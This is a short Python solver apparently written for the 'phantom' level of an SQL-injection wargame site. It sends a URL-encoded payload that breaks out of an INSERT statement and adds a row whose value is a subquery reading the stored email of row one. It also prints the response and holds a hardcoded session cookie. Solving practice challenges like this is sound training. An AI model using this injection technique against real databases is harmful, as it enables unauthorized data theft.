import requests

url = "https://los.rubiya.kr/chall/phantom_e2e30eaf1c0b3cb61b4b72a932c849fe.php?"
cookie = {'PHPSESSID':'794ju4btvebsfj9nati68fel4m'}

def solve():
    query = "joinmail=1%27),(0,%27183.103.29.81%27,(select%20a%20from%20(select%20email%20as%20a%20from%20prob_phantom%20where%20no=1)%20as%20a))%23"
    res = requests.get(url=url+query, cookies=cookie)

    if "@" in res.text:
        print(res.text)

if __name__ == "__main__":
    solve()
